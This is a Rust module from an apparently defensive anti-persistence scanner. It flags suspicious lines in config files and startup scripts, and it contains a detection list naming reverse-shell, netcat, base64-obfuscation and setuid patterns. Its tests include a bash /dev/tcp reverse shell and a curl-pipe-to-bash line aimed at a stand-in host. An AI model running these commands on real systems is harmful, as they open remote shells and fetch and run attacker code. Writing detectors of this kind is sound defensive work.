//! Shared helpers for reading configuration and flagging dangerous content.
//!
//! The anti-persistence checks mostly follow the same shape: read some config,
//! decide which parts are suspicious, show the operator, offer to act. The
//! detection half lives here so it can be tested without touching the system.

use std::fs;
use std::path::{Path, PathBuf};

use walkdir::WalkDir;

/// Substrings that are rarely legitimate inside a config file, startup script,
/// or scheduled job, paired with why they matter.
///
/// Deliberately specific: a check that flags every `curl` in every dotfile
/// wastes an operator's time during a competition. These are patterns that
/// indicate fetch-and-execute, reverse shells, obfuscation, or privilege
/// retention rather than ordinary administration.
pub const SUSPICIOUS_PATTERNS: &[(&str, &str)] = &[
    ("/dev/tcp/", "bash network redirection (reverse shell)"),
    ("/dev/udp/", "bash network redirection (reverse shell)"),
    ("bash -i", "spawns an interactive shell"),
    ("sh -i", "spawns an interactive shell"),
    ("nc -e", "netcat command execution"),
    ("ncat -e", "netcat command execution"),
    ("netcat -e", "netcat command execution"),
    ("mkfifo", "named pipe, common in reverse shells"),
    ("base64 -d", "base64 decoding (obfuscation)"),
    ("base64 --decode", "base64 decoding (obfuscation)"),
    ("| sh", "pipes output into a shell"),
    ("|sh", "pipes output into a shell"),
    ("| bash", "pipes output into a shell"),
    ("|bash", "pipes output into a shell"),
    ("python -c", "inline interpreter payload"),
    ("python3 -c", "inline interpreter payload"),
    ("perl -e", "inline interpreter payload"),
    ("ruby -e", "inline interpreter payload"),
    ("php -r", "inline interpreter payload"),
    ("chmod +s", "sets the setuid bit"),
    ("chmod u+s", "sets the setuid bit"),
    ("chmod 4755", "sets the setuid bit"),
    ("chattr +i", "makes a file immutable"),
    ("setsid", "detaches from the controlling terminal"),
    ("curl", "fetches remote content"),
    ("wget", "fetches remote content"),
];

/// Directories that no legitimate system config should execute out of.
pub const UNTRUSTED_EXEC_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/home/"];

/// Distinct reasons `text` looks suspicious. Empty means nothing matched.
///
/// Reasons are deduplicated, so three different `chmod` spellings that all
/// mean "sets the setuid bit" report that once.
///
/// # Examples
///
/// ```
/// use defender_cli::core::scan::suspicious_matches;
///
/// // Ordinary configuration raises nothing.
/// assert!(suspicious_matches("export PATH=$PATH:/usr/local/bin").is_empty());
///
/// // A reverse shell is explained, not merely flagged.
/// let reasons = suspicious_matches("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
/// assert!(reasons.contains(&"bash network redirection (reverse shell)"));
/// assert!(reasons.contains(&"spawns an interactive shell"));
/// ```
pub fn suspicious_matches(text: &str) -> Vec<&'static str> {
    let lowered = text.to_lowercase();
    let mut reasons: Vec<&'static str> = SUSPICIOUS_PATTERNS
        .iter()
        .filter(|(needle, _)| lowered.contains(needle))
        .map(|(_, why)| *why)
        .collect();

    reasons.dedup();
    reasons.sort_unstable();
    reasons.dedup();
    reasons
}

/// Whether `text` references an executable under a world-writable directory.
///
/// # Examples
///
/// ```
/// use defender_cli::core::scan::references_untrusted_dir;
///
/// assert!(references_untrusted_dir(r#"RUN+="/tmp/payload""#));
/// assert!(!references_untrusted_dir(r#"RUN+="/usr/bin/logger""#));
/// ```
pub fn references_untrusted_dir(text: &str) -> bool {
    UNTRUSTED_EXEC_DIRS.iter().any(|dir| text.contains(dir))
}

/// Trim surrounding whitespace, returning `None` for lines that carry no
/// directive at all — blanks and whole-line `#` or `;` comments.
///
/// # Examples
///
/// ```
/// use defender_cli::core::scan::effective_line;
///
/// assert_eq!(effective_line("  exit 0  "), Some("exit 0"));
/// assert_eq!(effective_line("# installed by the admin"), None);
/// assert_eq!(effective_line("   "), None);
/// ```
pub fn effective_line(line: &str) -> Option<&str> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with(';') {
        return None;
    }
    Some(trimmed)
}

/// Read every regular file under `dir` as UTF-8 text, sorted by path.
///
/// A missing directory yields an empty list; unreadable and non-UTF-8 files
/// are skipped rather than failing the whole check.
pub fn read_text_files(dir: &Path) -> Vec<(PathBuf, String)> {
    let mut files: Vec<(PathBuf, String)> = WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().is_file())
        .filter_map(|e| {
            fs::read_to_string(e.path())
                .ok()
                .map(|contents| (e.path().to_path_buf(), contents))
        })
        .collect();

    files.sort_by(|a, b| a.0.cmp(&b.0));
    files
}

/// Read a single file as text, treating "missing" and "unreadable" alike.
pub fn read_text_file(path: &Path) -> Option<String> {
    fs::read_to_string(path).ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_text_matches_nothing() {
        assert!(suspicious_matches("export PATH=$PATH:/usr/local/bin").is_empty());
    }

    #[test]
    fn detects_a_reverse_shell() {
        let reasons = suspicious_matches("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(reasons.contains(&"bash network redirection (reverse shell)"));
        assert!(reasons.contains(&"spawns an interactive shell"));
    }

    #[test]
    fn detects_fetch_and_execute() {
        let reasons = suspicious_matches("curl http://evil.test/x.sh | bash");
        assert!(reasons.contains(&"fetches remote content"));
        assert!(reasons.contains(&"pipes output into a shell"));
    }

    #[test]
    fn matching_is_case_insensitive() {
        assert!(!suspicious_matches("BASE64 --DECODE").is_empty());
    }

    #[test]
    fn reasons_are_deduplicated() {
        // Three separate needles all map to the setuid reason.
        let reasons = suspicious_matches("chmod +s a; chmod u+s b; chmod 4755 c");
        assert_eq!(
            reasons
                .iter()
                .filter(|r| **r == "sets the setuid bit")
                .count(),
            1
        );
    }

    #[test]
    fn flags_execution_out_of_world_writable_directories() {
        assert!(references_untrusted_dir("RUN+=\"/tmp/payload\""));
        assert!(references_untrusted_dir("/dev/shm/x"));
        assert!(!references_untrusted_dir("/usr/bin/systemctl"));
    }

    #[test]
    fn effective_line_skips_comments_and_blanks() {
        assert_eq!(effective_line("  exit 0 "), Some("exit 0"));
        assert_eq!(effective_line("# comment"), None);
        assert_eq!(effective_line("; also a comment"), None);
        assert_eq!(effective_line("   "), None);
    }
}
